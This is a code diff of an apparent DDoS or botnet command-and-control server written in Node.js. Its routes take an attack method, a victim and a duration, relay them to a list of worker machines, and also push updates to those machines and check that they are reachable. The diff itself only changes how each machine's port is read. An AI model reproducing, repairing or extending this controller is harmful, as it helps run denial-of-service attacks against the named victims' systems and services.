@@ -537,7 +537,7 @@ app.get('/all/attack/:methodID/:victim/:time/:attackID', async (req, res) => {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
         console.log(currentMachine);
-        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 machines.responded.push(currentMachine)
             })
@@ -559,7 +559,7 @@ app.get('/all/update', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/update`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/update`)
             .then(res => {
                 machines.responded.push(currentMachine)
             })
@@ -595,7 +595,7 @@ app.get('/machines/testReachability/', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/status`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/status`)
             .then(res => {
                 machines.responded.push(currentMachine)
             })
